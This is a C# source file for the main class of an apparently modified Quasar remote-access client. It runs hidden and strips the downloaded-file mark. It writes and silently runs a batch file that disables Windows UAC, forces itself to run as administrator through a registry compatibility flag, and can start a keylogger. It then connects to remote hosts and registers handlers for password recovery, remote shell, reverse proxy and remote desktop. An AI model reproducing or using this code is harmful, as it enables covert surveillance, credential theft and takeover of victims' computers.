using Microsoft.Win32;
using Quasar.Client.Config;
using Quasar.Client.Logging;
using Quasar.Client.Messages;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class QuasarApplication : Form
    {
        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private QuasarClient _connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;
        
        /// <summary>
        /// The background keylogger service used to capture and store keystrokes.
        /// </summary>
        private KeyloggerService _keyloggerService;

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection _userActivityDetection;

        /// <summary>
        /// Determines whether an installation is required depending on the current and target paths.
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
        /// </summary>
        public QuasarApplication()
        {
            _messageProcessors = new List<IMessageProcessor>();
            _notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// Override WinProc Win function
        /// </summary>
        /// <param name="m">System event message</param>
        /// 
        //protected override void WndProc(ref Message m)
        //{
        //    if (m.Msg == NativeMethods.WM_HOTKEY)
        //    {
        //        int id = m.WParam.ToInt32();
        //        if (id == 1)
        //        {
        //            Quasar.Client.Interception.InterceptionHelper.isAutoType = false;
        //            _connectClient?.Send(new NotifyMessageToServer { Type = "remote_hide" });
        //            string targetProcess = "WindowsUpdater";
        //            var processes = Process.GetProcessesByName(targetProcess);
        //            if (!processes.Any())
        //            {
        //                return;
        //            }
        //            foreach (var proc in processes)
        //            {
        //                try
        //                {
        //                    proc.Kill();
        //                    proc.WaitForExit();
        //                }
        //                catch (Exception ex)
        //                {
        //                    //Console.WriteLine($"Failed to kill PID {proc.Id}: {ex.Message}");
        //                }
        //            }                    
        //        }
        //    }
        //    base.WndProc(ref m);
        //}

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            // Always unregister hotkey to avoid leaking it
            NativeMethods.UnregisterHotKey(this.Handle, 1);
            base.OnFormClosed(e);
        }

        /// <summary>
        /// Initializes the notification icon.
        /// </summary>
        private void InitializeNotifyicon()
        {
            _notifyIcon.Text = "Quasar Client\nNo connection";
            _notifyIcon.Visible = true;
            try
            {
                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                _notifyIcon.Icon = SystemIcons.Application;
            }
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            // decrypt and verify the settings
            if (!Settings.Initialize())
                Environment.Exit(1);

            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            // check if process with same mutex is already running on system
            if (!ApplicationMutex.CreatedNew)
                Environment.Exit(2);

            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            var installer = new ClientInstaller();

            if (IsInstallationRequired)
            {
                // close mutex before installing the client
                ApplicationMutex.Dispose();

                try
                {
                    installer.Install();
                    Environment.Exit(3);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }
            else
            {
                try
                {
                    // (re)apply settings and proceed with connect loop
                    installer.ApplySettings();
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }

                if (!Settings.UNATTENDEDMODE)
                    //InitializeNotifyicon();

                if (Settings.ENABLELOGGER)
                {
                    _keyloggerService = new KeyloggerService();
                    _keyloggerService.Start();
                }

                new Thread(delegate ()
                {
                    //foreach (RegistryView view in new RegistryView[]
                    //{
                    //    RegistryView.Registry32,
                    //    RegistryView.Registry64
                    //})
                    //{
                        //try
                        //{
                        //    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))
                        //    {
                        //        RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true) ?? registryKey.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                        //        if (registryKey2 != null)
                        //        {
                        //            registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                        //            registryKey2.Close();
                        //        }
                        //    }
                        //}
                        //catch (Exception)
                        //{
                        //}

                        // Get the user's temp folder
                        string tempFolder = Path.GetTempPath();
                        if (string.IsNullOrEmpty(tempFolder))
                        {
                            MessageBox.Show("Failed to get temp folder path to disable UAC");
                            return;
                        }

                        // Generate a random GUID for the batch file name
                        string guid = Guid.NewGuid().ToString();
                        string batchFileName = Path.Combine(tempFolder, $"{guid}.bat");

                        // Batch script content
                        string batchContent = @"
                            @echo off
                            :: Ensure the script runs as administrator
                            if not ""%~1""=="""" goto :run
                            powershell -Command ""Start-Process '%~f0' -ArgumentList ':run' -Verb RunAs""
                            exit

                            :run
                            :: Disable User Account Control (UAC)
                            reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
                            ";

                        try
                        {
                            // Write the batch file to the temp folder
                            File.WriteAllText(batchFileName, batchContent);

                            // Execute the batch file
                            ProcessStartInfo startInfo = new ProcessStartInfo
                            {
                                FileName = batchFileName,
                                UseShellExecute = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            };

                            Process.Start(startInfo);

                            //Console.WriteLine($"Batch file created and executed: {batchFileName}");
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show($"An error occurred: {ex.Message}");
                        }
                    //}
                    foreach (RegistryView view2 in new RegistryView[]
                    {
                        RegistryView.Registry32,
                        RegistryView.Registry64
                    })
                    {
                        try
                        {
                            using (RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view2))
                            {
                                RegistryKey registryKey4 = registryKey3.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", true) ?? registryKey3.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", true);
                                if (registryKey4 != null)
                                {
                                    registryKey4.SetValue(Assembly.GetExecutingAssembly().Location, "~ RUNASADMIN", RegistryValueKind.String);
                                    registryKey4.Close();
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                }).Start();

                var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();

                new Thread(() =>
                {
                    // Start connection loop on new thread and dispose application once client exits.
                    // This is required to keep the UI thread responsive and run the message loop.
                    _connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();

                //string hotkeyvalue = "Ctrl+Alt+K";
                //string input = hotkeyvalue.Trim();//txtHotkey.Text.Trim();
                //NativeMethods.UnregisterHotKey(this.Handle, 1);
                //if (TryParseHotkey(input, out int modifiers, out int vk))
                //{
                    //bool success = NativeMethods.RegisterHotKey(this.Handle, 1, NativeMethods.MOD_CONTROL|NativeMethods.MOD_ALT, (int)Keys.K);
                    //bool success = NativeMethods.RegisterHotKey(this.Handle, 1, modifiers, vk);

                //}
            }
        }

        private bool TryParseHotkey(string input, out int modifiers, out int key)
        {
            modifiers = 0;
            key = 0;

            if (string.IsNullOrWhiteSpace(input)) return false;

            string[] parts = input.Split(new[] { '+' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string part in parts)
            {
                string trimmed = part.Trim().ToLower();

                switch (trimmed)
                {
                    case "ctrl":
                    case "control":
                        modifiers |= NativeMethods.MOD_CONTROL;
                        break;
                    case "alt":
                        modifiers |= NativeMethods.MOD_ALT;
                        break;
                    case "shift":
                        modifiers |= NativeMethods.MOD_SHIFT;
                        break;
                    case "win":
                    case "windows":
                        modifiers |= NativeMethods.MOD_WIN;
                        break;
                    default:
                        if (Enum.TryParse(trimmed, true, out Keys parsedKey))
                        {
                            key = (int)parsedKey;
                        }
                        else
                        {
                            return false;
                        }
                        break;
                }
            }

            return key != 0;
        }

        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            if (connected)
                _notifyIcon.Text = "Quasar Client\nConnection established";
            else
                _notifyIcon.Text = "Quasar Client\nNo connection";
        }

        /// <summary>
        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(QuasarClient client)
        {
            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new KeyloggerHandler());
            _messageProcessors.Add(new MessageBoxHandler());
            _messageProcessors.Add(new PasswordRecoveryHandler());
            _messageProcessors.Add(new RegistryHandler());
            _messageProcessors.Add(new RemoteDesktopHandler());
            _messageProcessors.Add(new RemoteShellHandler(client));
            _messageProcessors.Add(new ReverseProxyHandler(client));
            _messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new StartupManagerHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            _messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler());
            _messageProcessors.Add(new WebsiteVisitorHandler());
            _messageProcessors.Add(new KBMDriverHandler());
            _messageProcessors.Add(new CaptureUnblockHandler());
            _messageProcessors.Add(new RedTextHandler());
            _messageProcessors.Add(new AutoTypeHandler());
            _messageProcessors.Add(new AudioTransferHandler());
            _messageProcessors.Add(new RTActionHandler());
            _messageProcessors.Add(new CustomCommandHandler(this));

            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Register(msgProc);
                //if (msgProc is NotificationMessageProcessor notifyMsgProc)
                 //   notifyMsgProc.ProgressChanged += ShowNotification;
            }
        }

        /// <summary>
        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                //if (msgProc is NotificationMessageProcessor notifyMsgProc)
                //    notifyMsgProc.ProgressChanged -= ShowNotification;
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        private void ShowNotification(object sender, string value)
        {
            if (Settings.UNATTENDEDMODE)
                return;
            
            _notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _keyloggerService?.Dispose();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
